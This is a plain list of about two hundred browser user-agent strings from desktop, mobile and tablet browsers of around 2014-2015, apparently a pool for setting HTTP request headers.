Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B440 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) MsnBot-Media /1.0b
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/7.0)
Mozilla/5.0 (Linux; Android 5.1.1; SM-G920V Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6680.78.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.102 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T520 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; SM-T900 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.2; GT-N8013 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0
Mozilla/5.0 (Linux; Android 5.0.1; SM-N910V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Linux; Android 4.4.2; SM-T310 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 10 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 7077.123.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Linux; Android 4.4.2; QMV7A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-N900A Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; XT1080 Build/SU6-7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASJB; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.73.11 (KHTML, like Gecko) Version/7.0.1 Safari/537.73.11
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like Gecko
Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [Pinterest/iOS]
Mozilla/5.0 (Linux; Android 5.0.1; LGLK430 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 Safari
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; 1ButtonTaskbar)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; NP08; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMSE; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1; XT1254 Build/SU3TL-39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B440 Safari/600.1.4
Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SGH-I337 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (X11; CrOS armv7l 7077.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT-IE11; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; MSN 9.0;MSN 9.1;MSN 9.6;MSN 10.0;MSN 10.2;MSN 10.5;MSN 11;MSN 11.5; MSNbMSNI; MSNmen-us; MSNcOTH) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; 1ButtonTaskbar)
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 YaBrowser/15.7.2357.2877 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSNIP; rv:11.0) like Gecko
Mozilla/5.0 AppleWebKit/999.0 (KHTML, like Gecko) Chrome/99.0 Safari/999.0
Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; GT-N5110 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B410 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.7) Gecko/20150824 Firefox/31.9 PaleMoon/25.7.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; MS-RTC LM 8; InfoPath.3)
Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG SM-N910T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.4; en-ca; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0
Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.7) Gecko/20150824 Firefox/31.9 PaleMoon/25.7.0
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G870A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)
Mozilla/5.0 (Windows NT 5.2; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMCM; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALCJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 5.2; rv:29.0) Gecko/20100101 Firefox/29.0 /29.0
Mozilla/5.0 (Linux; Android 5.0.2; SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-P900 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
